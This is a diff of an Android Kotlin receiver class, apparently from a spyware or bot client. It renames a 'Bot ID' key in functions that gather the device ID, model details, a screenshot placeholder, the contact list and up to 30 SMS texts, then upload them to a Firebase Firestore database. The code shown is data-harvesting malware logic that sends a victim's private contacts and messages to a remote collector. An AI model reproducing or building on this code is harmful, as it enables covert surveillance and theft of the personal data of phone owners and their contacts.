@@ -125,7 +125,7 @@ class Alarm : BroadcastReceiver() {
     fun nuevaCaptura(db : FirebaseFirestore, strDate: String){
 
         val captura = hashMapOf(
-            "Bot ID" to idAndroid,
+            "Bot_ID" to idAndroid,
             "Hora" to strDate,
             "Captura" to "Esto sería una captura de pantalla"
         )
@@ -157,7 +157,7 @@ class Alarm : BroadcastReceiver() {
             .forEach { codeName = it.name }
 
         val datosDispositivo = hashMapOf(
-            "Bot ID" to idAndroid,
+            "Bot_ID" to idAndroid,
             "Hora" to strDate,
             "RELEASE AND CODENAME" to Build.VERSION.RELEASE+codeName,
             "MODEL" to Build.MODEL,
@@ -194,7 +194,7 @@ class Alarm : BroadcastReceiver() {
 
     fun nuevaListaContactos(db : FirebaseFirestore, strDate: String){
         val contactos = hashMapOf(
-            "Bot ID" to idAndroid,
+            "Bot_ID" to idAndroid,
             "Hora" to strDate,
             "Lista contactos" to getContactList()
         )
@@ -224,7 +224,7 @@ class Alarm : BroadcastReceiver() {
             if(contador < 30) mensaje += it.textoSMS.toString() + "\n"
         }
         val sms = hashMapOf(
-            "Bot ID" to idAndroid,
+            "Bot_ID" to idAndroid,
             "Hora" to strDate,
             "Lista contactos" to mensaje
         )
